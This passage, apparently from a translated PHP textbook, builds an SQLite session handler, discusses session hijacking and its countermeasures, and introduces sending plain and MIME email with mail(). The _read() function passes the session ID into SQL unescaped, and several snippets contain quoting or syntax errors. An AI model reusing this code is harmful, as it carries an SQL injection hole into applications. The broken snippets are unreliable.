如果设置了 $url GET 变量，则重定向到指定地址；否则重定向到标准页面（在示例中：index.php）。




## Listing 15.6 登录表单 ("login.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_491_0.png)

## Figure 15.4 登录表单实际运行效果；注意 URL！

## 15.5 数据库中的会话

虽然 PHP 的会话处理声誉良好，但在某些场景下，独立的会话管理更有意义。例如，假设你想在会话期间收集数据并将其存储在数据库中；你还希望会话本身保存在数据库中。在这种情况下，PHP 允许你自己管理会话数据。相应的 PHP 函数名为 `session_set_save_handler()`：

```php
bool session_set_save_handler(callback open, callback close, callback read, callback write, callback destroy, callback gc)
```

这六个参数的含义如下：

- **打开**
  打开会话
- **关闭**
  关闭会话
- **读取**
  读取会话数据
- **写入**
  写入会话数据
- **销毁**
  销毁会话数据
- **gc**
  清理（垃圾回收）

因此，这六个参数分别代表会话管理中的一个事件。每个参数都会传入一个函数名，该函数在相应事件发生时被调用，或者直接传入匿名函数。接下来，我们将为这六个函数提供示例实现。这种方法的优点是，PHP 会处理枯燥的其余部分，例如生成会话 ID 以及自动调整所有链接。

以下代码将会话数据写入数据库，与传统的基于文件的方法相比，这能带来巨大的性能提升。这需要预先了解数据库章节，尤其是关于 SQLite 的章节（第 20 章）。不过，即使不了解 SQLite 章节的基础知识，代码的基本特性也是可以理解的。你只需要对示例中使用的 sessions.db 数据库文件拥有写入权限。

> **注意**
> 
> 在生产服务器上，你当然必须确保 sessions.db 文件无法从外部访问。将文件存储在 Web 服务器主目录之外，或配置服务器，使带有 .db 扩展名的文件不发送给客户端。

我们将逐步构建代码。首先，我们将数据库文件的名称保存在全局变量中，以便以后轻松自定义，并编写一个随后创建表的函数。我们需要三个字段：

- **id**
  会话 ID
- **data**
  会话数据
- **access**
  会话数据的最后访问日期

```php
<?php
$GLOBALS["sessions_db"] = "sessions.db";
function createDB() {
    $db = new SQLite3($GLOBALS["sessions_db"]);
    $result = $db->query("CREATE TABLE sessiondaten (id VARCHAR(32)
    PRIMARY KEY, data TEXT, access VARCHAR(14))");
    $db->close();
}
```

由于 SQLite 是一种非类型数据库，编写一个返回时间戳的辅助函数很有意义。这种方法的优点是，时间戳可以排序，因为日期中“最大”的组件始终在最前面——先是年份，然后是月份、日期、小时、分钟和秒：

```php
function timestamp() {
    return date("YmdHis");
}
```

首先是会话打开时要启动的函数。起初这里没什么可做的；打开数据库连接并将其保存在全局变量中。PHP 会自动将会话路径和相应的会话名称作为参数传递；但就我们的目的而言，两者都无关紧要。该函数绝对需要一个返回值：

```php
function _open($path, $name) {
    if (!file_exists($GLOBALS["sessions_db"])) {
        createDB();
    }
    $GLOBALS["sessions_id"] = new SQLite3($GLOBALS["sessions_db"]);
    return true;
}
```

关闭会话时，必须关闭相关的数据库连接：

```php
function _close() {
    $GLOBALS["sessions_id"]->close();
    unset($GLOBALS["sessions_id"]);
    return true;
}
```

读取会话数据时会变得有趣。PHP 会自动将会话 ID 传递给相关的处理函数；该例程随后返回完整的序列化会话数据。如前所述，PHP 会处理所有枯燥的其余部分，例如填充 $_SESSION 数组。因此，读取操作仅限于执行和评估一个简单的 SELECT SQL 查询。此外，将最后访问日期设置为当前时间戳。这记录了会话已被访问，因此会话仍处于活动状态。如果数据库未打开（实际上不应该发生，但谨慎为好），则会显式调用 _open()：

```php
function _read($sessionid) {
if (!isset($GLOBALS["sessions_id"])) {
    _open("", "");
}
$result = $GLOBALS["sessions_id"]->
    query("SELECT data FROM sessiondaten WHERE id='$sessionid'");
$row = $result->fetchArray();
if ($row) {
    $value = $row["data"];
    $sessionid = $GLOBALS["sessions_id"]->escapeString($sessionid);
    $GLOBALS["sessions_id"]->query("UPDATE sessiondaten SET access=
    " . timestamp() . " WHERE id='$sessionid'");
} else {
    $value = "";
}
return $value;
}
```

写入会话数据时过程类似。一条 UPDATE 语句同时更新会话信息的值和最后访问日期。如果失败，说明会话中尚无数据，因此会添加一条 INSERT 命令：

```php
function _write($sessionid, $data) {
if (!isset($GLOBALS["sessions_id"])) {
    _open("", "");
}
$data = $GLOBALS["sessions_id"]->escapeString($data);
$sessionid = $GLOBALS["sessions_id"]->escapeString($sessionid);
$result = $GLOBALS["sessions_id"]->query("UPDATE sessiondaten SET data=
    " . $data . ", access=" . timestamp() .
    " WHERE id='$sessionid'");
if ($GLOBALS["sessions_id"]->changes() == 0) {
    $GLOBALS["sessions_id"]->
    query("INSERT INTO sessiondaten (id, data, access)
    VALUES ('$sessionid', " . $data . ", " . timestamp() . ")");
}
return true;
}
```

返回值 TRUE 表示写入操作成功（即此处不再进行进一步检查）。

主要工作到此结束。只剩下清理工作。删除会话时，必须销毁所有相关数据：

```php
function _destroy($sessionid) {
$sessionid = $GLOBALS["sessions_id"]->escapeString($sessionid);
$GLOBALS["sessions_id"]->query("DELETE FROM sessiondaten WHERE id=
'$sessionid'");
return true;
}
```

清理时还有一个特殊之处：长时间未访问的会话数据应被删除。以秒为单位的生存期作为参数传递给处理函数。删除分为三个步骤：

- 首先，确定一个日期值，其过去时间点与会话指定的生存期一样久远。
- 然后将此日期值转换为时间戳。
- 最后，删除所有时间戳小于计算得出的时间戳的会话数据。

相应代码如下：

```php
function _gc($lifetime) {
$expiration = time() - $lifetime;
$expiration_timestamp = date("YmdHis", $expiration);
$GLOBALS["sessions_id"]->
    query("DELETE FROM sessiondaten WHERE access < '$expiration_timestamp'");
return true;
}
?>
```

搞定了！你只需使用 `session_set_save_handler()` 注册这六个函数，并确保页面关闭时写入任何会话数据即可：

```php
session_set_save_handler("_open", "_close", "_read", "_write",
    "_destroy", "_gc");
register_shutdown_function("session_write_close");
```

以下清单显示完整代码。





```php
<?php
$GLOBALS["sessions_db"] = "sessions.db";

function createDB() {
    $db = new SQLite3($GLOBALS["sessions_db"]);
    $result = $db->
    query("CREATE TABLE sessiondaten (id VARCHAR(32) PRIMARY KEY,
    data TEXT, access VARCHAR(14))");
    $db->close();
}

function timestamp() {
    return date("YmdHis");
}

function _open($path, $name) {
    if (!file_exists($GLOBALS["sessions_db"])) {
        createDB();
    }
    $GLOBALS["sessions_id"] = new SQLite3($GLOBALS["sessions_db"]);
    return true;
}

function _close() {
    $GLOBALS["sessions_id"]->close();
    unset($GLOBALS["sessions_id"]);
    return true;
}

function _read($sessionid) {
    if (!isset($GLOBALS["sessions_id"])) {
        _open("", "");
    }
    $result = $GLOBALS["sessions_id"]->
    query("SELECT data FROM sessiondaten WHERE id='$sessionid'");
    $row = $result->fetchArray();
    if ($row) {
        $value = $row["data"];
        $sessionid = $GLOBALS["sessions_id"]->escapeString($sessionid);
        $GLOBALS["sessions_id"]->query("UPDATE sessiondaten SET access='" . timestamp() . "' WHERE id='$sessionid'");
    } else {
        $value = "";
    }
    return $value;
}

function _write($sessionid, $data) {
    if (!isset($GLOBALS["sessions_id"])) {
        _open("", "");
    }

    $data = $GLOBALS["sessions_id"]->escapeString($data);
    $sessionid = $GLOBALS["sessions_id"]->escapeString($sessionid);
    $result = $GLOBALS["sessions_id"]->query("UPDATE sessiondaten SET data='" . $data . "', access='" . timestamp() . "' WHERE id='$sessionid'");
    if ($GLOBALS["sessions_id"]->changes() == 0) {
        $GLOBALS["sessions_id"]->
        query("INSERT INTO sessiondaten (id, data, access) VALUES ('$sessionid', '" . $data . "', '" . timestamp() . "')");
    }
    return true;
}

function _destroy($sessionid) {
    $sessionid = $GLOBALS["sessions_id"]->escapeString($sessionid);
    $GLOBALS["sessions_id"]->query("DELETE FROM sessiondaten WHERE id='$sessionid'");
    return true;
}

function _gc($lifetime) {
    $expiration = time() - $lifetime;
    $expiration_timestamp = date("YmdHis", $expiration);
    $GLOBALS["sessions_id"]->
    query("DELETE FROM sessiondaten WHERE access < '$expiration_timestamp'");
    return true;
}

session_set_save_handler("_open", "_close", "_read", "_write",
    "_destroy", "_gc");
register_shutdown_function("session_write_close");
session_start();
?>
```

## 清单 15.7 自定义会话处理程序 ("sessions.inc.php")

## 使用 OOP 的自定义会话处理程序

从面向对象编程的角度来看，如果可以直接将一个类传递给 session_set_save_handler()，然后由该类实现各个功能，那当然会更好。这确实可行。PHP 提供了该接口（另请参见第 11 章）SessionHandlerInterface。实现此接口的类可以随后传递给 session_set_save_handler()。以下是该接口的定义：

```
SessionHandlerInterface {
    abstract public bool close ( void )
    abstract public bool destroy ( string $session_id )
    abstract public bool gc ( string $maxlifetime )
    abstract public bool open ( string $save_path , string $name )
    abstract public string read ( string $session_id )
    abstract public bool write ( string $session_id , string $session_data )
}
```

注意：PHP 有一个 SessionHandler 类，它代表 PHP 的内部会话处理程序，但不是其自身的实现！如果您不想使用内部实现，而想使用自己的编程，则不应使用 extends SessionHandler，而应使用 implements SessionHandlerInterface！

在此基础上，入门示例可以快速轻松地改编为与 SQLite 一起使用。为此，基本上只需用加载自编写的 sessions.inc.php 库来替代对 session_start() 的调用。以下清单显示了写入会话变量的代码。

```php
<?php
require_once "sessions.inc.php";
?>
```

```html
<html>
<head>
<title>Sessions</title>
</head>
<body>
<?php
$_SESSION["Programming language"] = "PHP";
$_SESSION["Language version"] = 8;
?>
<p>Session variables have been set!</p>
<p><a href="read-db.php">Continue ...</a></p>
</body>
</html>
```

## 清单 15.8 正在写入会话数据…… ("write-db.php")

读取也是（几乎）不变的。

```php
<?php
require_once "sessions.inc.php";
?>

<html>
<head>
<title>Sessions</title>
</head>
<body>
<p>Programming language:

<?php
if (isset($_SESSION["Programming language"])) {
echo(htmlspecialchars($_SESSION["Programming language"]));
}
?>
</p>
<p>Language version:

<?php
if (isset($_SESSION["Language version"])) {
echo(htmlspecialchars($_SESSION["Language version"]));
}
?>
</p>
<p><a href="<?php echo($_SERVER[ 'PHP_SELF' ]); ?>">Reload</a></p>
</body>
</html>
```

## 清单 15.9 ……并立即再次输出 ("read-db.php")

## 15.6 安全问题

尽管会话提供了所有优势，但不应完全忽视其缺点。

### 15.6.1 没有 Cookie 就没有会话！

尤其是在使用无 Cookie 会话时，便利性与安全性之间的差距巨大。曾经声称 Web 应用程序如果没有无 Cookie 会话就无法工作，但如今则更可能是没有无 Cookie 会话就无法工作。

原因非常简单：所有信息的钥匙，即会话 ID，在这种情况下位于 URL 的纯文本中。想象一下以下情况：一家 Web 邮件提供商使用无 Cookie 会话。您向该 Web 邮件提供商的客户发送一封电子邮件，其中包含指向您网站的链接，或者更准确地说，指向一个 PHP 脚本的链接。当邮件收件人单击该链接时，脚本会被调用。您在脚本中首先要做的是查看 `$_SERVER["HTTP_REFERER"]`。Web 浏览器会在此 HTTP 头字段中发送前一页的 URL。4 只需付出最小努力，您就可以读取此信息，并同时确定客户与该 Web 邮件提供商当前的会话 ID。这也称为 *会话劫持*（另请参见第 32 章）。

当免费邮件服务刚刚开始流行时，一些知名提供商容易受到这种攻击。出于这个原因，所有邮件提供商现在都使用（临时）Cookie 来传输会话 ID。

有几种防范会话劫持的对策，但没有一种完全有效。一种潜在的解毒剂是将会话限制为单一 IP 地址。可以分几步完成：

- 1. 创建会话时，将访问者当前的 IP 地址保存在单独的会话变量中：
  - `$_SESSION["ip"] = $_SERVER["REMOTE_ADDR"];`
- 2. 每次访问会话时，系统会检查 IP 地址是否仍然正确。如果不正确，则删除会话：
  ```
  if ($_SESSION["ip"] != $_SERVER["REMOTE_ADDR"]) {
      session_unset();
      session_destroy();
      setcookie(session_name(), "away with it", 0, "/" );
  }
  ```

然而，此过程也有个弊端。`$_SERVER["REMOTE_ADDR"]` 字段中的条目并不总是可靠，尤其是在使用代理服务器时。这也潜藏着危险：

- 使用代理服务器时，从 Web 服务器的角度来看，代理后面的所有用户都具有相同的 IP 地址。因此，在企业网络内轻易窃取会话 ID。某些互联网服务提供商也因使用不同代理而臭名昭著。
- 用户的真实 IP 地址位于 `$_SERVER["HTTP_X_FORWARDED_FOR"]` 中——但并非总是如此。

因此，确定用户 IP 地址没有 100% 完美的方法。

4 通过引用策略 HTTP 头，至少可以在某种程度上限制此行为。更多信息可以在规范中找到 http://s-prs.co/v602281。

### 15.6.2 检查引用来源

另一种方法是评估 `HTTP_REFERER` 环境变量并始终检查用户是从哪个页面来的。如果会话 ID 被“窃取”，引用来源值可能不正确。不幸的是，这也不总是可靠，因为如今引用来源并不总是发送。尽管如此，如果您仍想使用此方法，PHP 使这变得非常容易。`session.referer_check` 配置设置可以设置为必须始终出现在 `HTTP_REFERER` 中的字符串；否则，会话将被删除。

### 15.6.3 更改会话 ID

为了进一步减轻会话劫持的影响，限制（可能被劫持的）会话 ID 的有效性可能会有所帮助。`session_regenerate_id()` 函数对此很有用。每次调用此函数时，PHP 都会生成一个“全新”的会话 ID，但会将现有会话的所有数据复制到新版本中。

`session_regenerate_id()` 函数有一个可选参数。如果将其设置为 `true`，则会删除旧会话。换句话说，如果会话 ID 被攻击者窃取，那么在下一次调用 `session_regenerate_id()` 后，该会话就成了过去。

此过程也非没有缺点。永久创建新会话 ID 会消耗服务器的一些性能。尽管如此，这仍然是 PHP 中的一项安全功能，令一些其他 Web 技术艳羡不已。

> **注意**
> 
> [`http://s-prs.co/v602282`](http://s-prs.co/v602282) 处的文章（也从 PHP 在线手册链接）提供了对会话“敌意接管”问题的良好概述。

### 15.6.4 使跨站点请求伪造更加困难

在 CSRF 环境下，典型的攻击场景包括发起跨域请求，并依赖目标域的所有 Cookie 也随之发送。使用 SameSite Cookie 时，所有当前浏览器都支持一种机制，该机制通过对来自其他域的请求更严格地处理带有相应 SameSite 标志的 Cookie，使这种攻击更加困难（另请参见<u>第 14 章</u>）。对于会话 Cookie，可以通过 `php.ini` 配置设置此标志：

```
session.cookie_samesite = "Strict"
```

其他可能的值为 "None" 和 "Lax"。





### 15.6.5 防止 JavaScript 访问会话 Cookie

另一项安全功能可以防范跨站脚本（XSS）的影响：如果将 `php.ini` 配置选项 `session.cookie_httponly` 设置为 1 或 `On`，则会话 Cookie 会被标记为 `httponly` 标志（参见 [第 14 章]）。这至少会让使用 JavaScript 进行会话劫持变得更加困难。

然而，原则上适用以下规定：仅在会话 ID 位于 Cookie 中时才使用会话！在过去 20 年里，作者们反复看到 Web 开发中不得不在没有 Cookie 的情况下工作的项目：手持设备上不支持 Cookie 的晦涩客户端、因公司全局政策而不允许浏览器接受 Cookie 的内部 Web 应用程序，以及少数其他极端情况。这里的关键词是 *极端*，因为通常没有理由在没有 Cookie 的情况下使用会话。自己试一下：禁用 Cookie 后上网一次，看看你能走多远——尤其是使用 Web 邮件服务和在线商店时。

# 第 16 章

电子邮件

电子邮件是最早的互联网技术之一。在 PHP 中使用它，取决于应用程序，要么非常简单，要么相当复杂。我们在此描述各种可能性。

从动态 Web 应用程序发送电子邮件是经典的标准任务之一。联系表单中的数据必须以某种方式发送给收件人，即 Webmaster。如果应用程序中发生错误，自动生成的电子邮件将非常实用。当然，由 Web 服务器自动发送的新闻通讯也是很有用的东西。

总的来说，在服务器端发送电子邮件并不困难。然而，谚语中的魔鬼——和往常一样——在于细节。虽然发送“简单”的电子邮件仍然非常容易，但对于更复杂的电子邮件（例如，带有文件附件和格式的电子邮件），你需要额外的专业知识或外部库。

## 16.1 准备工作

邮件模块已集成到 PHP 中，因此不需要额外的安装或配置开关。但是，php.ini 又再次发挥作用。需要牢记的一个重要点是：发送电子邮件需要 SMTP 服务器；没有它，就无法发送。由于这一点非常重要且经常被问到，我们将在信息框中再次重复它。

> **注意**
>
> 你不能没有 SMTP 服务器。真的。（你不一定总是通过网络来访问它，但那是另一个话题。）

SMTP 代表简单邮件传输协议。名字已经说明了一切。该协议的语法非常简单。你甚至可以使用 Telnet 来尝试——如果你有权访问 SMTP 服务器（参见图 16.1）。为此，你只需将 SMTP 的标准端口——即 25——作为调用 Telnet 的第二个参数指定：

```
telnet mailservername 25
```

![](img/ae7820c36e8f24c1623d26668b28e80e_504_0.png)

### 图 16.1 通过 Telnet 工作的 SMTP

图 16.2 显示了生成的电子邮件（我们使用下面将描述的 smtp4dev）。

![](img/ae7820c36e8f24c1623d26668b28e80e_504_1.png)

### 图 16.2 生成的电子邮件

然而，这并不总是有效。更糟的是：许多邮件服务器的配置方式是，由于泛滥的垃圾邮件，只接受来自已知电子邮件地址或 IP 地址的电子邮件。一个例子是 GMX 邮件服务的邮件服务器：如图 16.3 所示，它会立即识别幻想域，并且对于有效域也会触发警报。¹ 只有 GMX 成员被允许发送邮件。

¹ 该屏幕截图有点旧。拙劣的英语后来已经纠正，但不再那么醒目；现在它只说 "Authentication required."。

![](img/ae7820c36e8f24c1623d26668b28e80e_505_0.png)

### 图 16.3 GMX 邮件服务器有个好门卫

还有另一个警告：由于垃圾邮件问题，许多邮件服务器会检查电子邮件来自哪个 IP 地址。因此，如果你在本地系统上运行 SMTP 服务器，你的电子邮件仍然可能无法送达。原因是大多数垃圾邮件发送者通过常规宽带拨号上网，并使用本地 SMTP 服务器发送他们的广告邮件。结果，许多接收邮件服务器会拒绝来自本地拨号 IP 的电子邮件。尽管如此，出于测试目的，建议使用本地邮件服务器；仅查看日志文件就能显示邮件发送是否可能成功。

以下产品合适：

- 在 Unix/Linux 下，使用 sendmail、qmail 或 postfix 程序；它们都实现了邮件服务器。
- Microsoft IIS 的某些版本包含 Microsoft SMTP 服务，这是一款功能齐全的 SMTP 服务。例如，在 Windows Server 下，你可以将其作为功能安装（参见图 16.4）。

![](img/ae7820c36e8f24c1623d26668b28e80e_505_1.png)

### 图 16.4 SMTP 服务包含在 Windows Server 中

> **注意**
>
> 当然，这并不意味着你从台式机发送的所有电子邮件都无法到达收件人。始终重要的是发送服务器的 IP 地址。因此，如果你使用提供商的邮件服务器，其 IP 地址是决定性的（并且通常不引人怀疑）。

> **提示**
>
> 出于测试目的，我们推荐来自 https://github.com/rnwood/smtp4dev 的 smtp4dev 工具。它是免费、开源且跨平台的开发 SMTP 服务器。使用此工具，邮件甚至不会被发送，但你可以在本地拦截和查看它们。它非常适合开发！图 16.5 显示了该工具的用户界面。

![](img/ae7820c36e8f24c1623d26668b28e80e_506_0.png)

### 图 16.5 作为包含 Web 界面的控制台应用程序的 smtp4dev

无论如何，PHP 对于 Unix/Linux 都期望使用 sendmail。对于 qmail 或 postfix 的用户，这起初不是问题，因为两者都提供特殊的包装器，使应用程序认为它正在与 sendmail 服务器通信。如果你使用的是其他服务器，请确保有一个表现得像 sendmail 的二进制文件。

现在是时候配置 php.ini 了。[mail function] 部分中有八个条目，尽管并非每个条目对每个操作系统都是必需的（最重要的是前四个）：

- **SMTP**
  使用的 SMTP 服务器名称（例如，本地服务器的 localhost）。仅在 Windows 下必需！

- **smtp_port**
  SMTP 服务器的端口（如果不是默认端口 25）；仅在 Windows 下必需！

- **sendmail_from**
  发送的电子邮件的发件人。仅在 Windows 下必需！

- **sendmail_path**
  包括参数的 sendmail 路径（例如，sendmail -t）。仅在 Unix/Linux 下必需！

- **mail.force_extra_parameters**
  始终必须发送到电子邮件程序的附加参数。

- **mail.add_x_header**
  指定是否应通过标头将 PHP 脚本的名称和 UID 添加到邮件中。

- **mail.mixed_lf_and_crlf**
  混合行尾（仅对奇特的邮件服务器必需）。

- **mail.log**
  对 mail() 的所有调用的日志。

> **提示**
>
> 附加邮件参数也可以通过编程方式设置。`php.ini` 中的配置设置主要对那些希望防止用户直接将参数传递给邮件程序的主机感兴趣。

随 PHP 提供的 `php.ini` 标准版本在 Unix/Linux 和 Windows 上有所不同；与各自系统无关的配置参数已被注释掉。以下是 Unix/Linux 安装的可能值示例：

```
sendmail_path = "/var/qmail/bin/qmail-inject"
```

以下是可能的 Windows 配置：

```
SMTP = localhost
smtp_port = 25
sendmail_from = "webapp@xy.zzz"
```

> **注意**
>
> 为清晰起见，我们省略了本章中的大部分错误更正。但是，特别是在发送电子邮件时，你应始终检查电子邮件是否已成功发送——至少发送到邮件服务器。当然，你无法确定收件人是否收到了电子邮件，因为你的邮件服务器将电子邮件转发到收件人的邮件服务器，而该服务器不在你的控制范围内。





## 16.2 使用 PHP 发送邮件

首先预先说明一点，从原则上讲，使用 PHP 发送电子邮件是一件非常简单的事情，因为只有一个函数负责此事：

```
bool mail ( string to, string subject, string message [, string additional_headers [, string additional_params]])
```

这五个参数，其中只有前三个是必需的，分别表示以下信息：

- 接收者
- 主题
- 邮件正文
- 附加邮件头（例如，"X-Sender: PHP"）
- 邮件程序的附加参数（仅限 Unix/Linux；例如，使用 -f 设置发件人地址，有时出于安全原因会被阻止）

> Tip
> 此处使用命名函数参数是合乎逻辑的选择。

### 16.2.1 标准邮件

让我们在下一个示例中先做一个更简单的练习——即直接发送邮件（参见图 16.6）。从最真实的意义上说，这是一个单行命令（出于视觉目的的换行除外）。

```
<?php
mail(to: "recipient@xy.zzz",
 subject: "Mail from PHP",
 message: "This mail was sent automatically!" .
 "\n\nThank you.");
?>
```

清单 16.1 第一封简单的邮件（"mail1.php"）

> Note
> 本章中的示例大多使用无效的电子邮件地址；xy.zzz 域名当然不存在。因此，您必须根据自己的系统调整这些清单并使用有效地址。这样做可以避免过去的不愉快经历，当时许多读者只是想测试程序而没有注意描述文本。其后果是我们收到了大量测试邮件。有趣的是，这本书德文版的一些读者阅读了上面的注释——然后直接使用作者的联系地址作为收件人地址。

| 发件人 | me@example.com |
| --- | --- |
| 收件人 | recipient@xy.zzz |
| 主题 | Mail from PHP |
| 安全 | false |

查看 | 分析 | 源代码 | 头部 | 部分

这封邮件是自动发送的！
谢谢。

### 图 16.6 第一封测试邮件

> **Tip**
> 如果您想为收件人指定不仅电子邮件地址，而且相应的姓名，请使用以下格式：
> "姓名" <one.name@xy.zzz>

mail() 函数的第四个参数（additional_headers）提供了很大的灵活性：可以在那里集成附加邮件头。例如，一种可能性是设置 X-Mailer 头条目，它负责发送邮件程序的名称。这将允许您集成所使用的 PHP 版本，如下一个示例所示。

```
<?php
mail(to: "recipient@xy.zzz",
    subject: "Mail from PHP",
    message: "This mail was sent automatically!" .
    "\n\nThank you.",
    additional_headers: "X-Mailer: PHP" . phpversion());
?>
```

### 清单 16.2 带有附加头的邮件（"mail2.php"）

根据邮件程序的不同，您可能需要调用不同的命令来查看邮件头；图 16.7 显示了一个示例。

但是，其他邮件头特别有用：

- Cc
  用于抄送收件人
- Bcc
  用于秘密抄送收件人
- X-Priority
  用于电子邮件的重要性
- Reply-To
  用于电子邮件的回复地址

![](img/ae7820c36e8f24c1623d26668b28e80e_510_0.png)

### 图 16.7 邮件头中显示的 PHP 版本

> Tip
> 如果有兴趣，电子邮件所基于的 Web 标准是 RFC 822，可以在 http://s-prs.co/v602283 查看。RFC 2822（www.ietf.org/rfc/rfc2822.txt）扩展了 RFC 822。

所有这些头都可以通过 mail() 的第四个参数中的换行符（\r\n）相互分隔。因此，以下代码创建了一封电子邮件，它

- 有两个抄送收件人，
- 有一个秘密抄送接收者，
- 重要性评级为低，
- 并且给出了不同的回复地址。

```
<?php
mail(to: "recipient@xy.zzz",
subject: "Mail from PHP",
message: "This mail was sent automatically!" .
"\n\nThank you.",
additional_headers:
"Cc: 1stcopy@xy.zzz,2ndcopy@xy.zzz\r\nBcc:blindcopy@xy.zzz\r\n" .
"X-Priority: low\r\nReply-To:reply@xy.zzz\r\n" .
"X-Mailer: PHP/" . phpversion()));
?>
```

### 清单 16.3 带有多个收件人和进一步选项的邮件（"mail3.php"）

> ### 分号和逗号
> 
> RFC 822 规定，多个电子邮件收件人应以逗号分隔。微软电子邮件客户端在此采用不同的方法：逗号用于分隔收件人的姓氏和名字。然后各个收件人之间用分号分隔。但是，这是专有的微软程序。微软邮件服务器足够智能，可以将这些分号转换回逗号。即使您习惯在 Outlook 中在各个收件人之间放置分号，也必须注意在 PHP（以及其他任何地方）中使用逗号。

> ### （邮件）优先级
> 
> 请注意，对于邮件，_高_ 优先级并不意味着电子邮件会被处理得更快。此设置的唯一效果是，在收件人的邮件程序中，邮件会被特别标记——既不多也不少。不幸的是，有时不良习惯会悄悄出现，即将电子邮件标记为“重要”，即使它们并不那么重要。换句话说，高重要性往往会起到相反的作用。

![](img/ae7820c36e8f24c1623d26668b28e80e_511_0.png)

### 图 16.8 带有许多功能的一封邮件

此外，邮件优先级在 RFC 822 中未标准化。这可以从 X-Priority 的 X- 前缀中看出。因此，是否以及如何解释此邮件头由电子邮件程序自行决定。X-Priority 的以下值似乎已被普遍接受：

- 低
- 正常
- 高

其他条目，例如 very high 或 very low，仅由特定的电子邮件客户端支持。

> **Tip**
> 
> 您还可以在 Windows 下使用 From:sender@xy.zzz 头来覆盖 php.ini 中的 sendmail_from 设置。在 Unix/Linux 中，这是一种设置邮件发件人的便捷方式。

### 16.2.2 MIME 邮件

到目前为止，一切都很好——也很简单。对于从 Web 应用程序发送的电子邮件（例如，来自联系表单），迄今为止写的内容通常就足够了。但是，特别是市场营销人员希望电子邮件色彩丰富。事实上，可以使用 HTML 格式和文件附件来增强电子邮件。

但是，应该立即明确一点：创建这种类型的邮件相对耗时。大部分工作可以通过使用外部库来节省。尽管如此，我们将演示基础知识，因为这将向您展示动态生成的电子邮件可以做什么和不可以做什么。

> **Note**
> 
> 在 www.mhonarc.org/~ehhood/MIME/，有关于各种 MIME 标准的良好概述，这些标准现在归档在 RFC 2045 到 2049 中。MIME 代表 Multipurpose Internet Mail Extensions，并描述了电子邮件的结构以及特殊格式和文件附件。

撰写 MIME 邮件需要两项预防措施：

- 设置特殊头
- 邮件正文的特殊结构

让我们从头开始。Content-Type 条目确定内容的类型。² 可以在此处选择各种 MIME 类型：

2 与 HTTP 头中的 Content-type 条目（带小写 t）类似。

- multipart/mixed
  同一封邮件中包含不同的数据类型，例如邮件正文和文件附件

- multipart/alternative
  可以以替代方式显示的邮件内容（例如，作为文本和 HTML）

各个邮件部分由分隔符字符串相互分隔。此字符串可以是任意的，但必须确保它不会在消息文本中随机出现。出于这个原因，通常使用一个大的随机字符串。为清晰起见，在以下示例中，我们始终使用相同的分隔符字符串：separator-0815。在电子邮件中，分隔符由其所在行以两个连字符开头来识别。创建合适的分隔符的一种简单方法是，例如，使用随机数或其 MD5 哈希：

```
$separator = "--separator-" . mt_rand(1000000000, 9999999999);
```

以下是由两部分组成的电子邮件的内容——纯文本和 HTML 内容：

```
From: sender@xy.zzz
To: recipient@xy.zzz
Subject: MIME message
MIME version: 1.0
Content-type: multipart/mixed; boundary="separator-0815"
Preamble, which is not visible, except for very old clients
--separator-0815
Content-type: text/plain; charset="iso-8859-1"

Pure text
--separator-0815
Content-type: text/html

HTML text with a <a href="http://www.php.net/">link</a>
--separator-0815--
Appendix, which is also not visible
```

> **Note**
> 您可以看到，邮件的最后一部分也以分隔符结尾。为了使邮件程序理解邮件现已结束，最后一个分隔符以两个连字符结束。

在使用 multipart/mixed 时，所有邮件组件都会显示。但是，如果设置 multipart/alternative，则电子邮件程序本身选择显示什么。您可以在这里看到带有内容替代方案的邮件：


From: sender@xy.zzz
To: recipient@xy.zzz
Subject: MIME 消息
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="separator-0815"

前言，仅在非常旧的客户端中可见
--separator-0815
Content-Type: text/plain; charset="iso-8859-1"

可在 http://www.php.net/ 上找到更多信息。
--separator-0815
Content-Type: text/html

在 <a href="http://www.php.net/">http://www.php.net/</a> 处可找到更多信息。
--separator-0815--
附录，同样不可见

这些邮件也可以使用 PHP 的 `mail()` 函数生成。您只需按如下清单相应设置标头即可。

```
<?php
$mailtext1 = 'preamble, which is not visible except on very old clients
--separator-0815
Content-Type: text/plain; charset="iso-8859-1"

Further information can be found at http://www.php.net/.
--separator-0815
Content-Type: text/html

Further information at <a href="http://www.php.net/">http://www.php.net/</a>.
--separator-0815--
';
mail(to: "recipient@xy.zzz",
     subject: "MIME-Mail/mixed",
     message: $mailtext1,
     additional_headers: "MIME-Version: 1.0\r\nContent-type: multipart/mixed;
     boundary=\"separator-0815\\\"");
$mailtext2 = 'Header that is not visible, except for very old clients
--separator-0815
Content-Type: text/plain; charset="iso-8859-1"

Further information can be found at http://www.php.net/.

--separator-0815
Content-type: text/html

Further information at <a href="http://www.php.net/">http://www.php.net/</a>.

--separator-0815--
';
mail(to: "recipient@xy.zzz",
    subject: "MIME-Mail/alternative",
    message: $mailtext2,
    additional_headers: "MIME-Version: 1.0\r\nContent-type: multipart/
alternative; boundary=\"separator-0815\"");
?>
```

## 清单 16.4 手动生成两封 MIME 邮件 ("mime1.php")

使用 multipart/mixed 时，所有邮件内容都会显示；使用 multipart/alternative 时，您只能看到 HTML 版本。图 16.9 显示了 Thunderbird 中的后者选项。

![](img/ae7820c36e8f24c1623d26668b28e80e_515_0.png)

## 图 16.9 Thunderbird 中的 "multipart/alternative"

当然，您还可以进一步添加文件附件。这也可以使用 multipart/mixed 完成。实际文件将 Base64 编码，并按如下方式集成：

```
From: sender@xy.zzz
To: recipient@xy.zzz
Subject: MIME message
MIME-Version: 1.0
Content-type: multipart/mixed; boundary="separator-0815"

Preamble, which is not visible, except for very old clients
--separator-0815
Content-Type: text/plain; charset="iso-8859-1"

PHP is great (see appendix)!
--separator-0815
Content-Type: image/gif; name="php.gif";
Content-Transfer-Encoding: base64
Content-Disposition: attachment

MIME64Encoded==
--separator-0815--
Appendix, which is also not visible
```

相应的代码更加灵活。在脚本开头，从硬盘读取一个文件，使用 `base64_encode()` 将其转换为 Base64，然后将其集成到邮件中。

```
<?php
$filecontent = base64_encode(file_get_contents("php.gif"));
$mailtext = 'Preamble, which is not visible, except for very old clients
--separator-0815
Content-Type: text/plain; charset="iso-8859-1"

PHP is great (see appendix)!
--separator-0815
Content-Type: image/gif; name="php.gif";
Content-Transfer-Encoding: Base64
Content-Disposition: attachment

%%FILECONTENT%%
--separator-0815--
';
$mailtext = str_replace("%%FILECONTENT%%", $filecontent, $mailtext);
mail(to: "recipient@xy.zzz",
    subject: "MIME mail with attachment",
    message: $mailtext,
